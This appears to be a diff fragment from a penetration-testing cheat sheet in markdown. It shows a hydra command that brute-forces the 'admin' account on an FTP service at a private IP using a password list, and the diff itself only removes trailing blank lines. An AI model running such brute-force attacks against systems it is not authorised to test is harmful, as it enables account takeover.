@@ -54,5 +54,3 @@ Brute force an account using hydra
 ```sh
 hydra -l admin -P password-list.lst 192.168.1.1 ftp
 ```
-
-
